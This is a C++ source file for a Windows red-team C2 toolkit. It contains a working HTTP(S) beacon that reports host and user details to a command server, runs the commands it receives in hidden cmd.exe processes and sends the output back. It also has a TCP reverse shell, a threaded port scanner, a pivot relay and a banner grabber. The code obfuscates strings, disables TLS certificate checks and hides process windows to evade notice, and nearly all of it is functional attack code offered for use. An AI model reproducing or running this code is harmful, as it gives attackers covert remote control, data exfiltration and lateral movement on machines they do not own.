/*
  net_toolkit.cpp — Module 07 workable (Red-Team C2 Networking)
  ==============================================================
  Operational networking toolkit that pairs with c2-server/ in this repo.
  All comms via WinINet (same as full_stub.cpp).  No _popen anywhere.

  Compile:
    g++ -std=c++17 -O2 -s -o net_toolkit.exe net_toolkit.cpp \
        -lws2_32 -lwininet -lkernel32

  Commands:
    net_toolkit.exe beacon  <host> <port> <auth>     HTTP(S) C2 beacon loop
    net_toolkit.exe agent   <host> <port>            TCP reverse shell
    net_toolkit.exe scan    <host> <lo-hi>           threaded TCP port scan
    net_toolkit.exe proxy   <lport> <rhost> <rport>  TCP pivot relay
    net_toolkit.exe grab    <host> <port>             TCP banner grab
*/
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <algorithm>
#include <cstdio>

// ── compile-time string obfuscation ──────────────────────────────────────────
template<size_t N> struct ObfStr {
    char data[N];
    constexpr ObfStr(const char (&s)[N]):data{}{for(size_t i=0;i<N;i++)data[i]=s[i]^0x5A;}
    std::string d()const{std::string o(data,N-1);for(char&c:o)c^=0x5A;return o;}
};
constexpr ObfStr OB_UA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
constexpr ObfStr OB_CHECKIN("/checkin?auth=");
constexpr ObfStr OB_CMD("/cmd?auth=");
constexpr ObfStr OB_RESULT("/result?auth=");

// ── URL encode ────────────────────────────────────────────────────────────────
static std::string urlEnc(const std::string& s){
    std::string o; for(unsigned char c:s){
        if(isalnum(c)||c=='-'||c=='_'||c=='.'||c=='~')o+=(char)c;
        else{char b[4];snprintf(b,sizeof(b),"%%%02X",c);o+=b;}
    } return o;
}

// ── WinINet GET ───────────────────────────────────────────────────────────────
static std::string httpGet(const char* host, INTERNET_PORT port, bool https,
                            const std::string& path){
    DWORD flags=INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE;
    if(https) flags|=INTERNET_FLAG_SECURE|INTERNET_FLAG_IGNORE_CERT_CN_INVALID
                    |INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    HINTERNET hi=InternetOpenA(OB_UA.d().c_str(),INTERNET_OPEN_TYPE_PRECONFIG,0,0,0);
    if(!hi) return "";
    HINTERNET hc=InternetConnectA(hi,host,port,0,0,INTERNET_SERVICE_HTTP,0,0);
    HINTERNET hr=HttpOpenRequestA(hc,"GET",path.c_str(),0,0,0,flags,0);
    if(https){DWORD opt=SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                        |SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        InternetSetOptionA(hr,INTERNET_OPTION_SECURITY_FLAGS,&opt,sizeof(opt));}
    std::string r;
    if(HttpSendRequestA(hr,0,0,0,0)){
        char buf[4096];DWORD rd=0;
        while(InternetReadFile(hr,buf,sizeof(buf)-1,&rd)&&rd>0) r.append(buf,rd);
    }
    InternetCloseHandle(hr);InternetCloseHandle(hc);InternetCloseHandle(hi);
    return r;
}

// ── shell exec (CreateProcess + pipes, no _popen, no window) ─────────────────
static std::string shellExec(const std::string& cmd){
    SECURITY_ATTRIBUTES sa{sizeof(sa),0,TRUE};
    HANDLE hR=0,hW=0;
    if(!CreatePipe(&hR,&hW,&sa,0)) return "[pipe error]";
    SetHandleInformation(hR,HANDLE_FLAG_INHERIT,0);
    STARTUPINFOA si{sizeof(si)};
    si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE; si.hStdOutput=hW; si.hStdError=hW;
    si.hStdInput=GetStdHandle(STD_INPUT_HANDLE);
    PROCESS_INFORMATION pi{};
    std::string full="cmd.exe /c "+cmd;
    char* cl=new char[full.size()+1]; memcpy(cl,full.c_str(),full.size()+1);
    bool ok=CreateProcessA(0,cl,0,0,TRUE,CREATE_NO_WINDOW,0,0,&si,&pi)!=0;
    CloseHandle(hW); delete[]cl;
    std::string out; if(ok){
        char buf[4096];DWORD rd=0;
        while(ReadFile(hR,buf,sizeof(buf)-1,&rd,0)&&rd>0) out.append(buf,rd);
        WaitForSingleObject(pi.hProcess,10000);
        CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
    }
    CloseHandle(hR);
    return out.empty()?"(no output)":out;
}

// ── beacon: HTTP C2 loop ──────────────────────────────────────────────────────
static void modeBeacon(const char* host, int port, const char* auth){
    char hn[64]={};DWORD hs=sizeof(hn);GetComputerNameA(hn,&hs);
    char user[64]={};DWORD us=sizeof(user);GetUserNameA(user,&us);
    std::string id(hn);
    std::string info="host="+std::string(hn)+"|user="+user+"|pid="+std::to_string(GetCurrentProcessId());
    bool https=(port==443||port==8443);
    printf("[+] Beacon %s:%d  id=%s  https=%d\n",host,port,id.c_str(),(int)https);
    while(true){
        std::string ci=OB_CHECKIN.d()+auth+"&id="+urlEnc(id)+"&info="+urlEnc(info);
        httpGet(host,(INTERNET_PORT)port,https,ci);
        std::string cmd=httpGet(host,(INTERNET_PORT)port,https,
                                 OB_CMD.d()+auth+"&id="+urlEnc(id));
        while(!cmd.empty()&&(cmd.back()=='\r'||cmd.back()=='\n')) cmd.pop_back();
        if(!cmd.empty()&&cmd!="null"){
            printf("[*] cmd: %s\n",cmd.c_str());
            std::string out=shellExec(cmd);
            httpGet(host,(INTERNET_PORT)port,https,
                    OB_RESULT.d()+auth+"&id="+urlEnc(id)+"&data="+urlEnc(out));
            if(cmd=="uninstall") break;
        }
        printf("[.] poll\n"); Sleep(5000);
    }
}

// ── agent: TCP reverse shell ─────────────────────────────────────────────────
static void sendAll(SOCKET s,const std::string& d){
    int sent=0,total=(int)d.size();
    while(sent<total){int n=send(s,d.c_str()+sent,total-sent,0);if(n<=0)break;sent+=n;}
}
static void modeAgent(const char* host, int port){
    WSADATA wsa; WSAStartup(MAKEWORD(2,2),&wsa);
    while(true){
        struct addrinfo hints{},*res=nullptr;
        hints.ai_family=AF_INET; hints.ai_socktype=SOCK_STREAM;
        char ps[16]; snprintf(ps,sizeof(ps),"%d",port);
        if(getaddrinfo(host,ps,&hints,&res)!=0){Sleep(5000);continue;}
        SOCKET s=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
        if(connect(s,res->ai_addr,(int)res->ai_addrlen)!=0){
            closesocket(s);freeaddrinfo(res);Sleep(5000);continue;
        }
        freeaddrinfo(res);
        char hn[64]={};DWORD hs=sizeof(hn);GetComputerNameA(hn,&hs);
        sendAll(s,std::string(hn)+"\n");
        char buf[4096];int n;
        while((n=recv(s,buf,sizeof(buf)-1,0))>0){
            buf[n]=0; std::string cmd(buf);
            while(!cmd.empty()&&(cmd.back()=='\n'||cmd.back()=='\r')) cmd.pop_back();
            if(cmd=="exit") break;
            std::string out=shellExec(cmd)+"\n__END__\n";
            sendAll(s,out);
        }
        closesocket(s); printf("[-] disconnected, retry in 5s\n"); Sleep(5000); break;
    }
    WSACleanup();
}

// ── scan: threaded TCP port scanner ──────────────────────────────────────────
static bool tcpOpen(const char* ip, int port, int ms){
    SOCKET s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(s==INVALID_SOCKET) return false;
    u_long nb=1; ioctlsocket(s,FIONBIO,&nb);
    sockaddr_in sa{}; sa.sin_family=AF_INET; sa.sin_port=htons((u_short)port);
    inet_pton(AF_INET,ip,&sa.sin_addr);
    connect(s,(sockaddr*)&sa,sizeof(sa));
    fd_set wfds; FD_ZERO(&wfds); FD_SET(s,&wfds);
    struct timeval tv={ms/1000,(ms%1000)*1000};
    bool open=(select(0,0,&wfds,0,&tv)>0&&FD_ISSET(s,&wfds));
    closesocket(s); return open;
}
static void modeScan(const char* host, int lo, int hi){
    WSADATA wsa; WSAStartup(MAKEWORD(2,2),&wsa);
    char ip[INET_ADDRSTRLEN]="";
    struct addrinfo hints{},*res=nullptr; hints.ai_family=AF_INET; hints.ai_socktype=SOCK_STREAM;
    if(getaddrinfo(host,nullptr,&hints,&res)==0){
        inet_ntop(AF_INET,&((sockaddr_in*)res->ai_addr)->sin_addr,ip,sizeof(ip));
        freeaddrinfo(res);
    } else {fprintf(stderr,"Cannot resolve %s\n",host);return;}
    printf("Scanning %s (%s) %d-%d\n\n",host,ip,lo,hi);
    std::vector<int> open; std::mutex mtx;
    std::atomic<int> idx{lo};
    auto worker=[&]{
        while(true){int p=idx.fetch_add(1);if(p>hi)break;
            if(tcpOpen(ip,p,500)){std::lock_guard<std::mutex> lk(mtx);open.push_back(p);}}
    };
    std::vector<std::thread> pool;
    for(int i=0;i<64;++i) pool.emplace_back(worker);
    for(auto& t:pool) t.join();
    std::sort(open.begin(),open.end());
    for(int p:open) printf("  %-6d OPEN\n",p);
    printf("\n%zu open ports\n",open.size());
    WSACleanup();
}

// ── proxy: TCP pivot relay ────────────────────────────────────────────────────
static DWORD WINAPI pipeDir(LPVOID p){
    SOCKET*ss=(SOCKET*)p; char buf[8192]; int n;
    while((n=recv(ss[0],buf,sizeof(buf),0))>0) send(ss[1],buf,n,0);
    shutdown(ss[1],SD_SEND); return 0;
}
static void modeProxy(int lport, const char* rhost, int rport){
    WSADATA wsa; WSAStartup(MAKEWORD(2,2),&wsa);
    SOCKET srv=socket(AF_INET,SOCK_STREAM,0);
    int opt=1; setsockopt(srv,SOL_SOCKET,SO_REUSEADDR,(char*)&opt,sizeof(opt));
    sockaddr_in sa{}; sa.sin_family=AF_INET; sa.sin_addr.s_addr=INADDR_ANY; sa.sin_port=htons((u_short)lport);
    bind(srv,(sockaddr*)&sa,sizeof(sa)); listen(srv,8);
    printf("[+] proxy 0.0.0.0:%d → %s:%d\n",lport,rhost,rport);
    while(true){
        sockaddr_in ca{}; int cl=sizeof(ca);
        SOCKET in=accept(srv,(sockaddr*)&ca,&cl); if(in==INVALID_SOCKET) break;
        struct addrinfo hints{},*res=nullptr; hints.ai_family=AF_INET; hints.ai_socktype=SOCK_STREAM;
        char ps[16]; snprintf(ps,sizeof(ps),"%d",rport);
        SOCKET out=INVALID_SOCKET;
        if(getaddrinfo(rhost,ps,&hints,&res)==0){
            out=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
            if(connect(out,res->ai_addr,(int)res->ai_addrlen)!=0){closesocket(out);out=INVALID_SOCKET;}
            freeaddrinfo(res);
        }
        if(out==INVALID_SOCKET){closesocket(in);continue;}
        static SOCKET p1[2],p2[2]; p1[0]=in;p1[1]=out; p2[0]=out;p2[1]=in;
        HANDLE h1=CreateThread(0,0,pipeDir,p1,0,0);
        HANDLE h2=CreateThread(0,0,pipeDir,p2,0,0);
        CloseHandle(h1); CloseHandle(h2);
    }
    closesocket(srv); WSACleanup();
}

// ── grab ─────────────────────────────────────────────────────────────────────
static void modeGrab(const char* host, int port){
    WSADATA wsa; WSAStartup(MAKEWORD(2,2),&wsa);
    char ip[INET_ADDRSTRLEN]="";
    struct addrinfo hints{},*res=nullptr; hints.ai_family=AF_INET; hints.ai_socktype=SOCK_STREAM;
    char ps[16]; snprintf(ps,sizeof(ps),"%d",port);
    if(getaddrinfo(host,ps,&hints,&res)==0){
        inet_ntop(AF_INET,&((sockaddr_in*)res->ai_addr)->sin_addr,ip,sizeof(ip));
        freeaddrinfo(res);
    } else {fprintf(stderr,"Cannot resolve\n");return;}
    SOCKET s=socket(AF_INET,SOCK_STREAM,0);
    sockaddr_in sa{}; sa.sin_family=AF_INET; sa.sin_port=htons((u_short)port); inet_pton(AF_INET,ip,&sa.sin_addr);
    if(connect(s,(sockaddr*)&sa,sizeof(sa))!=0){fprintf(stderr,"Connect failed\n");closesocket(s);return;}
    DWORD to=5000; setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char*)&to,sizeof(to));
    char buf[513]={};int n=recv(s,buf,512,0);
    printf("Banner (%d bytes): %s\n",n,n>0?buf:"(none)");
    closesocket(s); WSACleanup();
}

// ── main ─────────────────────────────────────────────────────────────────────
static void usage(){puts(
    "net_toolkit — Module 07 workable\n"
    "  beacon <host> <port> <auth>      HTTP(S) C2 beacon (pairs with c2-server/)\n"
    "  agent  <host> <port>             TCP reverse shell (CreateProcess+pipes)\n"
    "  scan   <host> <lo-hi>            threaded TCP port scan\n"
    "  proxy  <lport> <rhost> <rport>   TCP pivot relay\n"
    "  grab   <host> <port>             TCP banner grab");}
int main(int argc,char* argv[]){
    if(argc<2){usage();return 1;}
    std::string cmd(argv[1]);
    if(cmd=="beacon"&&argc==5) modeBeacon(argv[2],atoi(argv[3]),argv[4]);
    else if(cmd=="agent"&&argc==4) modeAgent(argv[2],atoi(argv[3]));
    else if(cmd=="scan"&&argc==4){
        int lo=1,hi=1024; const char*r=argv[3]; const char*d=strchr(r,'-');
        if(d){lo=atoi(r);hi=atoi(d+1);}else lo=hi=atoi(r);
        modeScan(argv[2],lo,hi);
    }
    else if(cmd=="proxy"&&argc==5) modeProxy(atoi(argv[2]),argv[3],atoi(argv[4]));
    else if(cmd=="grab"&&argc==4) modeGrab(argv[2],atoi(argv[3]));
    else {usage();return 1;}
    return 0;
}
